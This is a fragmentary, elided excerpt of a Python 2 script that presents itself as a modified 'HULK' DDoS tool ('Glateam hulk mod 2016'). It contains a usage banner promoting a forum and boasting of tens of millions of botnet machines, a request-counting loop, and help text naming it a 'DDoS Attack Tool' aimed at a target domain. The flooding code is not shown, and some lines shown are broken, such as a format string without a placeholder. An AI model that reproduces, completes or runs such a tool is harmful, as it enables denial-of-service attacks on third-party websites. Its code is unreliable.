...
def keyword_list():
        global keyword_top
        keyword_top.append('cuti')
        keyword_top.append('glateam')
...
def usage():
	print 'Glateam hulk mod 2016 '
	print 'Glateam forum: http://glateam.com'
	print 'New loaded Botnets: 39,445,657'
	print 'Usage: Gla.py (domain)'
	print 'Example: Gla.py http://glateam.com'
	print "\a"
print \
"""                                                       
_________________________________________________________________
  ...
  #######################################
  # Glateam hulk mod 2016 by cutivnpt  ##   
  # http://glateam.com                 ##
  #######################################
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "Glateam hulk: Sending " % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n ~>Glateam hulk DDoS Attack 2016"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Glateam hulk DDoS Attack Tool"
		print "Mode by cuti"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
